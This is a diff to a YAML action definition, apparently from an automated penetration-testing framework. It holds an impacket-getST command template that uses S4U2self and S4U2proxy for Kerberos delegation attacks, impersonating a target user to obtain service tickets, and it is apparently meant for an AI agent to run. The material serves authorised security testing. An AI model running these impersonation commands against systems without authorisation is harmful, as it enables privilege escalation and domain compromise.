@@ -6,8 +6,7 @@ preconditions:
 - has_cred
 parameters:
   target_ip: from_engagement.target_ip
-command_template: impacket-getST '{domain}/{username}:{password}' -spn '{spn}' -impersonate
-  {target_user} -dc-ip {target_ip}
+command_template: impacket-getST '{domain}/{username}:{password}' -spn '{spn}' -impersonate {target_user} -dc-ip {target_ip}
 parser: impacket_parser
 expected_effects:
 - tgs_obtained
@@ -16,6 +15,14 @@ falsifier:
   pattern: error|failed|refused|denied
   timeout: 30
 model_tier: haiku
-mechanism: S4U2self gets service ticket to self, S4U2proxy forwards to target SPN.
-  Used in delegation attacks (constrained/RBCD).
+mechanism: S4U2self gets service ticket to self, S4U2proxy forwards to target SPN. Used in delegation attacks (constrained/RBCD).
 hacktricks_ref: windows-hardening/active-directory-methodology/resource-based-constrained-delegation.md
+references:
+  ocd_mindmap_node_ids:
+  - 3ec1d28513
+  - 42e858082c
+  - 47b34a2482
+  - 76f6cd2a03
+  - a6b4953ca2
+  - b2c1068595
+  - c51a4811c0
